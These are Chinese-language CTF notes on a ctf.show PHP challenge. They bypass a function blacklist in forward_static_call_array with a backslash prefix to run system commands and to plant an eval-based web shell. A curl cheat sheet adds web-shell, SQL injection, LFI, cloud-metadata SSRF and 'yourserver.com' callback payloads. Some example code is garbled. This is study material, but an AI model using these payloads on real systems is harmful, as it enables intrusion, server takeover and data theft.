访问页面就是个源代码展现，得知forward_static_call_array
forward_static_call_array 是 PHP 中的一个内置函数，它允许你在运行时动态地调用一个静态方法 参数 call_user_func_array(array('类名', '静态方法名'), 参数数组); 例如 class test{ public function test(test1,test2){ } } call_user_func_array(['arraytest'],['test1','test2']) 默认情况下，php的命名空间 为\，这样的方式其实是一种绝对路径，通过绝对路径的方式去调用其他路径的函数 这个函数预期为参数为数组，所以我们需要给b变成数组，传入命令
` ?a=/system&b=[]=ls`
` ?a=/system&b=[]=cat flag.php`
得到flag `ctfshow{c5f4f2d5-0444-4f1d-b500-7cd1ed6a4ad2}`

制造一个一句话木马，这里必须要用http://不能使用https://因为蚁剑会报错,无法正常连接。
`http://561c81bb-2146-4ca7-9da0-60881358761d.challenge.ctf.show/?a=\file_put_contents&b[]=shell1.php&b[]=%3C?php%20eval\($_POST[%27cmd%27]\);%20?%3E`
`http://561c81bb-2146-4ca7-9da0-60881358761d.challenge.ctf.show/?a=\file_put_contents&b[]=shell1.php&b[]=<?php eval($_POST[%27cmd%27]); ?>`
PS：关键点在于需要添加`\` 来根据绝对路径调用函数，否则常见函数已被黑名单拦截，无法正常攻击。


-----

# CTF挑战Writeup：攻破forward_static_call_array漏洞

  

## 1. 攻击的网址

**目标URL：** https://561c81bb-2146-4ca7-9da0-60881358761d.challenge.ctf.show/

  

## 2. 攻击的过程

  

### 第一步：初步探索

我像一个侦探一样，首先访问了这个网站，想看看它有什么特别的地方。打开网页后，我发现了一段PHP代码，这是网站的源代码。这段代码就像是一个房子的设计图，让我看到了它的内部结构。

  

### 第二步：分析漏洞

仔细看这段代码，我发现了一个叫做`forward_static_call_array`的函数。这个函数就像是一个万能遥控器，可以调用很多不同的功能。代码中还有一个"黑名单"，列出了很多不能使用的函数名，比如`system`、`exec`等，这些都是可以执行命令的危险函数。

  

### 第三步：尝试各种方法

我试了很多方法：

1. 先试了`phpinfo`函数 - 被禁止了，返回"hacker"

2. 试了`print_r`函数 - 成功了！这说明函数调用机制是有效的

3. 试了各种文件操作函数 - 都没有成功

  

### 第四步：关键突破

我突然想到了一个办法！就像用密码开门时，有时候需要用特殊的方式输入密码。我尝试在`system`前面加一个反斜杠`\system`，这样它就不在黑名单上了！

  

**成功的payload：**

```

?a=\system&b[0]=ls -la

```

  

这个请求就像是对服务器说："请用system命令帮我列出所有文件"，服务器真的执行了！

  

### 第五步：找到宝藏

执行命令后，我看到了目录列表，发现了一个叫做`flag.php`的文件。这就像是找到了藏宝图！我马上用另一个命令读取这个文件：

  

```

?a=\system&b[0]=cat flag.php

```

  

### 第六步：获得flag

文件内容显示出了最终的flag：`ctfshow{c5f4f2d5-0444-4f1d-b500-7cd1ed6a4ad2}`

  

## 3. 攻击的原理

  

这个漏洞的原理就像是一个门卫只检查访客的名字，但不检查他们的身份证。

  

**通俗解释：**

- 网站有一个"黑名单"，上面写着不允许进入的人名（比如"system"）

- 但是当我用"\system"这个名字时，门卫一看，这个名字不在黑名单上，就让我进去了

- 进去后，我就可以做任何事情了

  

**技术原理：**

`forward_static_call_array`函数可以动态调用PHP函数。代码中的检测逻辑是：

```php

$a = strtolower($a);

if (!in_array($a, $dis, true)) {

forward_static_call_array($a, $b);

}

```

  

当我们传入`\system`时，`strtolower('\system')`的结果是`\system`，而黑名单中只有`system`，所以匹配不上，成功绕过了检测。

  

## 4. 攻击的具体步骤

  

### 步骤1：信息收集

```bash

curl -s https://561c81bb-2146-4ca7-9da0-60881358761d.challenge.ctf.show/

```

**作用：** 获取网页源代码，了解网站结构

  

### 步骤2：测试函数可用性

```bash

curl -s "https://561c81bb-2146-4ca7-9da0-60881358761d.challenge.ctf.show/?a=print_r&b%5B0%5D=1"

```

**作用：** 测试print_r函数是否可用，确认forward_static_call_array工作正常

  

### 步骤3：执行系统命令

```bash

curl -s "https://561c81bb-2146-4ca7-9da0-60881358761d.challenge.ctf.show/?a=\system&b%5B0%5D=ls+-la"

```

**作用：** 使用反斜杠绕过检测，执行ls命令查看目录文件

  

### 步骤4：读取flag文件

```bash

curl -s "https://561c81bb-2146-4ca7-9da0-60881358761d.challenge.ctf.show/?a=\system&b%5B0%5D=cat+flag.php"

```

**作用：** 读取flag.php文件内容，获取最终flag

  

## 5. 攻击的效果

  

通过上述步骤，我成功获取了flag：

```

ctfshow{c5f4f2d5-0444-4f1d-b500-7cd1ed6a4ad2}

```

  

这个flag就像是一个宝藏，证明了攻击的成功。整个过程就像是一场解谜游戏，通过分析代码、找到漏洞、构造payload，最终获得了目标。

  

## 6. 各种命令的含义

  

### curl命令

- **curl：** 就像是一个邮递员，可以帮你发送网络请求

- **-s：** 静默模式，不显示进度信息，就像邮递员悄悄送信不说话

- **URL：** 目标网址，就像是要送信的地址

  

### URL参数

- **?a=\system：** a参数设置为\system，就像是在信封上写收件人名字

- **&b[0]=ls -la：** b参数是一个数组，第一个元素是"ls -la"命令

- **%5B和%5D：** 分别是[和]的URL编码，就像是为了让邮递员看懂的特殊符号

  

### 系统命令

- **ls -la：** 列出目录下所有文件的详细信息，就像是打开抽屉看里面有什么

- **cat flag.php：** 显示文件内容，就像是打开信封读信

  

## 总结

  

这次攻击成功的核心在于理解了PHP的forward_static_call_array函数的工作原理，以及如何通过反斜杠绕过字符串匹配检测。这就像是找到了规则中的一个漏洞，然后巧妙地利用它来达到目的。

  

**学习要点：**

1. 在网络安全中，有时候绕过检测比直接攻击更有效

2. 理解代码的工作原理是找到漏洞的关键

3. 尝试不同的方法，不要轻易放弃

  

这次挑战让我学到了很多关于PHP函数调用和绕过技术的知识，就像是在实践中上了一堂生动的网络安全课！

-----



          
# curl 命令详解

curl 是一个强大的命令行工具，用于发送各种类型的 HTTP 请求。它支持多种协议，包括 HTTP、HTTPS、FTP、FTPS 等。

## 基本语法
```bash
curl [options] [URL]
```

## 常见用法和场景

### 1. 基本 GET 请求
```bash
# 简单的 GET 请求
curl https://example.com

# 显示响应头信息
curl -i https://example.com

# 只显示响应头
curl -I https://example.com

# 跟随重定向
curl -L https://example.com
```

### 2. POST 请求
```bash
# 发送 POST 请求
curl -X POST https://example.com

# 发送 POST 请求并携带数据
curl -X POST -d "name=John&age=30" https://example.com

# 发送 JSON 数据
curl -X POST -H "Content-Type: application/json" -d '{"name":"John","age":30}' https://example.com

# 从文件读取数据发送
curl -X POST -d @data.json https://example.com
```

### 3. 其他 HTTP 方法
```bash
# PUT 请求
curl -X PUT -d "data" https://example.com

# DELETE 请求
curl -X DELETE https://example.com

# PATCH 请求
curl -X PATCH -d "data" https://example.com
```

### 4. 请求头设置
```bash
# 设置 User-Agent
curl -H "User-Agent: MyBrowser/1.0" https://example.com

# 设置多个请求头
curl -H "Content-Type: application/json" -H "Authorization: Bearer token" https://example.com

# 设置 Cookie
curl -H "Cookie: name=value" https://example.com

# 或者使用 -b 参数
curl -b "name=value" https://example.com
```

### 5. 处理响应
```bash
# 将响应保存到文件
curl https://example.com -o output.html

# 使用 URL 中的文件名保存
curl -O https://example.com/file.zip

# 静默模式（不显示进度条）
curl -s https://example.com

# 显示详细信息（包括请求和响应）
curl -v https://example.com
```

### 6. 表单提交
```bash
# 提交表单数据
curl -F "name=John" -F "file=@localfile.txt" https://example.com/upload

# 模拟文件上传
curl -F "file=@image.jpg" https://example.com/upload
```

### 7. 认证
```bash
# 基本认证
curl -u username:password https://example.com

# Bearer Token 认证
curl -H "Authorization: Bearer your_token" https://example.com
```

### 8. Cookie 处理
```bash
# 保存 Cookie 到文件
curl -c cookies.txt https://example.com

# 从文件读取 Cookie
curl -b cookies.txt https://example.com

# 同时保存和读取 Cookie
curl -b cookies.txt -c cookies.txt https://example.com
```

### 9. 超时和重试
```bash
# 设置连接超时（秒）
curl --connect-timeout 10 https://example.com

# 设置总超时时间
curl -m 30 https://example.com

# 失败时重试
curl --retry 3 https://example.com
```

### 10. 代理和网络
```bash
# 使用代理
curl -x http://proxy:port https://example.com

# 设置 SOCKS 代理
curl --socks5 proxy:port https://example.com

# 指定 IP 地址解析
curl --resolve example.com:443:127.0.0.1 https://example.com
```

## 在 CTF 中的常见用法

### 1. Web Shell 利用
```bash
# 向 web shell 发送命令
curl -X POST -d "cmd=whoami" http://target/shell.php

# 获取 flag
curl -X POST -d "cmd=cat /flag" http://target/shell.php

# 执行多个命令
curl -X POST -d "cmd=id;pwd;ls -la" http://target/shell.php
```

### 2. SQL 注入测试
```bash
# 测试 SQL 注入点
curl "http://target/page?id=1' OR '1'='1"

# 使用 Burp Suite 风格的请求
curl -H "User-Agent: Mozilla/5.0" -H "Referer: http://target/" "http://target/page?id=1"
```

### 3. 文件包含漏洞利用
```bash
# 测试 LFI 漏洞
curl "http://target/page?file=/etc/passwd"

# 利用 PHP 伪协议
curl "http://target/page?file=php://filter/read=convert.base64-encode/resource=config.php"
```

### 4. SSRF 测试
```bash
# 测试 SSRF 漏洞
curl "http://target/page?url=http://127.0.0.1:8080/admin"

# 访问内网服务
curl "http://target/page?url=http://169.254.169.254/latest/meta-data/"
```

### 5. 命令执行验证
```bash
# 验证命令执行（DNS 请求）
curl "http://target/page?cmd=curl yourserver.com"

# 验证命令执行（HTTP 请求）
curl "http://target/page?cmd=wget http://yourserver.com"

# 写入文件验证
curl "http://target/page?cmd=echo '<?php phpinfo(); ?>' > info.php"
```

## 实用技巧

### 1. 组合使用
```bash
# 跟随重定向、显示详细信息、设置超时
curl -L -v --connect-timeout 10 https://example.com

# 静默模式、保存到文件、跟随重定向
curl -s -L -o output.html https://example.com
```

### 2. 调试和测试
```bash
# 显示请求和响应的详细信息
curl -v https://example.com

# 只显示请求头
curl -H "User-Agent: Test" --head https://example.com

# 测试不同 HTTP 方法
curl -X OPTIONS -v https://example.com
```

### 3. 批量操作
```bash
# 从文件读取 URL 列表并请求
curl -K urls.txt

# 并行处理多个请求
curl -Z https://example.com/page1 https://example.com/page2
```

## 常用参数总结

| 参数 | 说明 |
|------|------|
| -X | 指定 HTTP 方法 |
| -d | 发送数据 |
| -H | 设置请求头 |
| -b | 发送 Cookie |
| -c | 保存 Cookie |
| -L | 跟随重定向 |
| -i | 显示响应头 |
| -I | 只显示响应头 |
| -v | 显示详细信息 |
| -s | 静默模式 |
| -o | 保存到文件 |
| -O | 使用远程文件名保存 |
| -u | 基本认证 |
| -m | 设置超时时间 |
| -F | 发送表单数据 |

curl 是 CTF 中非常重要的工具，掌握这些用法可以帮助你更高效地进行安全测试和漏洞利用。



----

          
现在让我详细解释`forward_static_call_array`函数以及如何在PHP代码中传递参数来成功调用它。

## forward_static_call_array 函数详解

### 函数定义
`forward_static_call_array()` 是PHP的一个内置函数，用于调用一个静态方法，并将参数作为数组传递。

### 语法
```php
forward_static_call_array(callable $function, array $parameters): mixed
```

### 参数说明
1. **$function**: 要调用的函数或方法，可以是以下形式：
   - 字符串形式的函数名：`"function_name"`
   - 数组形式的类方法：`["ClassName", "methodName"]`
   
2. **$parameters**: 传递给函数的参数数组

### 功能特点
- 使用"后期静态绑定"来确定调用哪个类的方法
- 只能在类中调用，不能在类外部直接使用
- 与`forward_static_call`的区别在于参数传递方式

## 参数传递方式

在你的代码中，参数通过GET请求传递：
- `a`参数：指定要调用的函数名
- `b`参数：作为数组传递给函数的参数

### 示例说明

假设你想调用`phpinfo`函数：
```
?a=phpinfo&b[]=
```

如果你想调用需要参数的函数，比如`file_put_contents`：
```
?a=file_put_contents&b[]=test.txt&b[]=hello world
```

## 可以调用的函数

根据你提供的代码，黑名单中过滤了以下函数：
```php
array("var_dump","exec","readfile","highlight_file","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents","");
```

### 一些可能未被过滤的函数包括：

1. **`create_function`** - 创建匿名函数（在PHP 7.2.0后已废弃）
2. **`extract`** - 从数组中将变量导入到符号表
3. **`parse_str`** - 解析字符串为变量
4. **`unserialize`** - 反序列化数据
5. **`mail`** - 发送邮件
6. **`move_uploaded_file`** - 移动上传文件
7. **`rename`** - 重命名文件
8. **`copy`** - 复制文件
9. **`link`** - 创建硬链接
10. **`symlink`** - 创建符号链接
11. **`chmod`** - 改变文件模式
12. **`chown`** - 改变文件所有者
13. **`chgrp`** - 改变文件所属组
14. **`mkdir`** - 创建目录
15. **`rmdir`** - 删除目录
16. **`unlink`** - 删除文件
17. **`include`** / **`require`** - 包含文件
18. **`get_defined_vars`** - 获取由已定义变量组成的数组
19. **`get_defined_functions`** - 获取所有已定义的函数

## 实际使用示例

### 1. 调用phpversion函数（如果未被过滤）：
```
?a=phpversion&b[]=
```

### 2. 使用extract函数进行变量覆盖：
```
?a=extract&b[]=array('cmd'=>'system')
```

### 3. 使用create_function创建匿名函数（如果可用）：
```
?a=create_function&b[]=%24_POST[cmd]&b[]=eval(%24_POST[cmd]);
```

### 4. 创建文件：
```
?a=file_put_contents&b[]=shell.php&b[]=PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=
```

## 在类中的使用示例

根据你项目中的`CTFSHOW.php`文件，有一个`User`类。如果在类的方法中使用`forward_static_call_array`，可以这样写：

```php
class A {
    const NAME = 'A';
    public static function test() {
        $args = func_get_args();
        echo static::NAME, " ".join(',', $args)." \n";
    }
}

class B extends A {
    const NAME = 'B';
    public static function test() {
        echo self::NAME, "\n";
        // 使用forward_static_call_array调用父类方法
        forward_static_call_array(array('A', 'test'), array('more', 'args'));
    }
}

// 调用
B::test('foo');
```

## 安全注意事项

1. **动态函数调用风险**：允许用户控制函数名和参数是非常危险的，可能导致远程代码执行
2. **黑名单绕过**：即使有黑名单，也可能存在未被过滤的危险函数
3. **参数注入**：通过参数可以传递任意内容给函数执行

## 防护建议

1. **避免动态函数调用**：尽量不要根据用户输入动态调用函数
2. **白名单机制**：使用白名单而不是黑名单来限制可调用的函数
3. **输入验证**：对所有用户输入进行严格验证和过滤
4. **权限控制**：Web服务器应以最小权限运行

这些就是在PHP中使用`forward_static_call_array`函数的详细说明和使用方法。在实际应用中，这种动态函数调用的方式存在很大的安全风险，应该尽量避免使用。



